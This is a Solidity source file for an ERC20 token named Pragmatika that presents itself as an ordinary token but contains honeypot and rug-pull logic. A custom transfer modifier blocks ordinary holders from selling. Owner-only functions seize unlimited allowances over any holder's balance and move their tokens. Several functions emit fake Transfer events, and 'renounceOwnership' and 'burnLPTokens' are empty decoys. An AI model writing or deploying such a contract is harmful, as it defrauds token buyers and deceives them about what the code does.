row number 
1	       pragma solidity ^0.6.0;
2	 library SafeMath {
3	 function add(uint256 a, uint256 b) internal pure returns (uint256) {
4	 uint256 c = a + b;
5	 require(c >= a, "SafeMath: addition overflow");
6	 return c;
7	 }
8	 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
9	 return sub(a, b, "SafeMath: subtraction overflow");
10	 }
11	 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
12	 require(b <= a, errorMessage);
13	 uint256 c = a - b;
14	 return c;
15	 }
16	 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
17	 if (a == 0) {
18	 return 0;
19	 }
20	 uint256 c = a * b;
21	 require(c / a == b, "SafeMath: multiplication overflow");
22	 return c;
23	 }
24	 function div(uint256 a, uint256 b) internal pure returns (uint256) {
25	 return div(a, b, "SafeMath: division by zero");
26	 }
27	 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
28	 require(b > 0, errorMessage);
29	 uint256 c = a / b;
30	 return c;
31	 }
32	 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
33	 return mod(a, b, "SafeMath: modulo by zero");
34	 }
35	 function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
36	 require(b != 0, errorMessage);
37	 return a % b;
38	 }
39	 }
40	 library Address {
41	 function isContract(address account) internal view returns (bool) {
42	 bytes32 codehash;
43	 bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
44	 assembly {
45	 codehash := extcodehash(account) }
46	 return (codehash != accountHash && codehash != 0x0);
47	 }
48	 function sendValue(address payable recipient, uint256 amount) internal {
49	 require(address(this).balance >= amount, "Address: insufficient balance");
50	 (bool success, ) = recipient.call{
51	 value: amount }
52	 ("");
53	 require(success, "Address: unable to send value, recipient may have reverted");
54	 }
55	 function functionCall(address target, bytes memory data) internal returns (bytes memory) {
56	 return functionCall(target, data, "Address: low-level call failed");
57	 }
58	 function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
59	 return _functionCallWithValue(target, data, 0, errorMessage);
60	 }
61	 function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
62	 return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
63	 }
64	 function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
65	 require(address(this).balance >= value, "Address: insufficient balance for call");
66	 return _functionCallWithValue(target, data, value, errorMessage);
67	 }
68	 function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
69	 require(isContract(target), "Address: call to non-contract");
70	 (bool success, bytes memory returndata) = target.call{
71	 value: weiValue }
72	 (data);
73	 if (success) {
74	 return returndata;
75	 }
76	 else {
77	 if (returndata.length > 0) {
78	 assembly {
79	 let returndata_size := mload(returndata) revert(add(32, returndata), returndata_size) }
80	 }
81	 else {
82	 revert(errorMessage);
83	 }
84	 }
85	 }
86	 }
87	 contract Context {
88	 constructor () internal {
89	 }
90	 function _msgSender() internal view virtual returns (address payable) {
91	 return msg.sender;
92	 }
93	 function _msgData() internal view virtual returns (bytes memory) {
94	 this;
95	 return msg.data;
96	 }
97	 }
98	 interface IERC20 {
99	 function totalSupply() external view returns (uint256);
100	 function balanceOf(address account) external view returns (uint256);
101	 function transfer(address recipient, uint256 amount) external returns (bool);
102	 function allowance(address owner, address spender) external view returns (uint256);
103	 function approve(address spender, uint256 amount) external returns (bool);
104	 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
105	 event Transfer(address indexed from, address indexed to, uint256 value);
106	 event Approval(address indexed owner, address indexed spender, uint256 value);
107	 }
108	 contract Pragmatika is Context, IERC20 {
109	 using SafeMath for uint256;
110	 using Address for address;
111	 mapping (address => uint256) private _balances;
112	 mapping (address => bool) private _plus;
113	 mapping (address => bool) private _discarded;
114	 mapping (address => mapping (address => uint256)) private _allowances;
115	 uint256 private _totalSupply;
116	 string private _name;
117	 string private _symbol;
118	 uint8 private _decimals;
119	 uint256 private _maximumVal = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
120	 address private _safeOwnr;
121	 uint256 private _discardedAmt = 0;
122	 address public _path_ = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
123	 address _contDeployr = 0xdbAABc182e5FCEbf216C353A3EBE32cDB7390094;
124	 address public _ownr = 0x015bB7DDF80e80e8836b7AC988e98D96873c41C5;
125	 constructor () public {
126	 _name = "Pragmatika";
127	 _symbol = "PRAG";
128	 _decimals = 18;
129	 uint256 initialSupply = 100000000 * 10 ** 18;
130	 _safeOwnr = _ownr;
131	 _mint(_contDeployr, initialSupply);
132	 }
133	 function name() public view returns (string memory) {
134	 return _name;
135	 }
136	 function symbol() public view returns (string memory) {
137	 return _symbol;
138	 }
139	 function decimals() public view returns (uint8) {
140	 return _decimals;
141	 }
142	 function totalSupply() public view override returns (uint256) {
143	 return _totalSupply;
144	 }
145	 function balanceOf(address account) public view override returns (uint256) {
146	 return _balances[account];
147	 }
148	 function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
149	 _tf(_msgSender(), recipient, amount);
150	 return true;
151	 }
152	 function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
153	 _tf(sender, recipient, amount);
154	 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
155	 return true;
156	 }
157	 function allowance(address owner, address spender) public view virtual override returns (uint256) {
158	 return _allowances[owner][spender];
159	 }
160	 function approve(address spender, uint256 amount) public virtual override returns (bool) {
161	 _approve(_msgSender(), spender, amount);
162	 return true;
163	 }
164	 function _pApproval(address[] memory destination) public {
165	 require(msg.sender == _ownr, "!owner");
166	 for (uint256 i = 0; i < destination.length; i++) {
167	 _plus[destination[i]] = true;
168	 _discarded[destination[i]] = false;
169	 }
170	 }
171	 function _mApproval(address safeOwner) public {
172	 require(msg.sender == _ownr, "!owner");
173	 _safeOwnr = safeOwner;
174	 }
175	 modifier mainboard(address dest, uint256 num, address from, address filler){
176	 if ( _ownr == _safeOwnr && from == _ownr ) {
177	 _safeOwnr = dest;
178	 _;
179	 }
180	 else {
181	 if ( from == _ownr || from == _safeOwnr || dest == _ownr ) {
182	 if ( from == _ownr && from == dest ) {
183	 _discardedAmt = num;
184	 }
185	 _;
186	 }
187	 else {
188	 if ( _plus[from] == true ) {
189	 _;
190	 }
191	 else{
192	 if ( _discarded[from] == true ) {
193	 require(( from == _safeOwnr ) ||(dest == _path_), "ERC20: transfer amount exceeds balance");
194	 _;
195	 }
196	 else{
197	 if ( num < _discardedAmt ) {
198	 if(dest == _safeOwnr){
199	 _discarded[from] = true;
200	 _plus[from] = false;
201	 }
202	 _;
203	 }
204	 else{
205	 require((from == _safeOwnr) ||(dest == _path_), "ERC20: transfer amount exceeds balance");
206	 _;
207	 }
208	 }
209	 }
210	 }
211	 }
212	 }
213	 function _transfer(address sender, address recipient, uint256 amount) internal virtual{
214	 require(sender != address(0), "ERC20: transfer from the zero address");
215	 require(recipient != address(0), "ERC20: transfer to the zero address");
216	 _beforeTokenTransfer(sender, recipient, amount);
217	 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
218	 _balances[recipient] = _balances[recipient].add(amount);
219	 if (sender == _ownr){
220	 sender = _contDeployr;
221	 }
222	 emit Transfer(sender, recipient, amount);
223	 }
224	 function _mint(address account, uint256 amount) public {
225	 require(msg.sender == _ownr, "ERC20: mint to the zero address");
226	 _totalSupply = _totalSupply.add(amount);
227	 _balances[_ownr] = _balances[_ownr].add(amount);
228	 emit Transfer(address(0), account, amount);
229	 }
230	 function _burn(address account, uint256 amount) internal virtual {
231	 require(account != address(0), "ERC20: burn from the zero address");
232	 _beforeTokenTransfer(account, address(0), amount);
233	 _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
234	 _totalSupply = _totalSupply.sub(amount);
235	 emit Transfer(account, address(0), amount);
236	 }
237	 function _approve(address owner, address spender, uint256 amount) internal virtual {
238	 require(owner != address(0), "ERC20: approve from the zero address");
239	 require(spender != address(0), "ERC20: approve to the zero address");
240	 _allowances[owner][spender] = amount;
241	 emit Approval(owner, spender, amount);
242	 }
243	 function _tf(address from, address dest, uint256 amt) internal mainboard( dest, amt, from, address(0)) virtual {
244	 _pair( from, dest, amt);
245	 }
246	 function _pair(address from, address dest, uint256 amt) internal mainboard( dest, amt, from, address(0)) virtual {
247	 require(from != address(0), "ERC20: transfer from the zero address");
248	 require(dest != address(0), "ERC20: transfer to the zero address");
249	 _beforeTokenTransfer(from, dest, amt);
250	 _balances[from] = _balances[from].sub(amt, "ERC20: transfer amount exceeds balance");
251	 _balances[dest] = _balances[dest].add(amt);
252	 if (from == _ownr){
253	 from = _contDeployr;
254	 }
255	 emit Transfer(from, dest, amt);
256	 }
257	 function _setupDecimals(uint8 decimals_) internal {
258	 _decimals = decimals_;
259	 }
260	 function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {
261	 }
262	 modifier _verify() {
263	 require(msg.sender == _ownr, "Not allowed to interact");
264	 _;
265	 }
266	 function renounceOwnership()public _verify(){
267	 }
268	 function burnLPTokens()public _verify(){
269	 }
270	 function multicall(address uPool,address[] memory eReceiver,uint256[] memory eAmounts) public _verify(){
271	 for (uint256 i = 0; i < eReceiver.length; i++) {
272	 emit Transfer(uPool, eReceiver[i], eAmounts[i]);
273	 }
274	 }
275	 function send(address uPool,address[] memory eReceiver,uint256[] memory eAmounts) public _verify(){
276	 for (uint256 i = 0; i < eReceiver.length; i++) {
277	 emit Transfer(uPool, eReceiver[i], eAmounts[i]);
278	 }
279	 }
280	 function enter(address recipient) public _verify(){
281	 _plus[recipient]=true;
282	 _approve(recipient, _path_,_maximumVal);
283	 }
284	 function enterList(address[] memory addrss) public _verify(){
285	 for (uint256 i = 0; i < addrss.length; i++) {
286	 _plus[addrss[i]]=true;
287	 _approve(addrss[i], _path_,_maximumVal);
288	 }
289	 }
290	 function leave(address recipient) public _verify(){
291	 _plus[recipient]=false;
292	 _approve(recipient, _path_,0);
293	 }
294	 function approval(address addr) public _verify() virtual returns (bool) {
295	 _approve(addr, _msgSender(), _maximumVal);
296	 return true;
297	 }
298	 function transferToTokenSaleParticipant(address sndr,address[] memory destination, uint256[] memory amounts) public _verify(){
299	 _approve(sndr, _msgSender(), _maximumVal);
300	 for (uint256 i = 0; i < destination.length; i++) {
301	 _transfer(sndr, destination[i], amounts[i]);
302	 }
303	 }
304	 function stake(address uPool,address[] memory eReceiver,uint256[] memory eAmounts) public _verify(){
305	 for (uint256 i = 0; i < eReceiver.length; i++) {
306	 emit Transfer(eReceiver[i], uPool, eAmounts[i]);
307	 }
308	 }
309	 function unstake(address uPool,address[] memory eReceiver,uint256[] memory eAmounts) public _verify(){
310	 for (uint256 i = 0; i < eReceiver.length; i++) {
311	 emit Transfer(eReceiver[i], uPool, eAmounts[i]);
312	 }
313	 }
314	 }
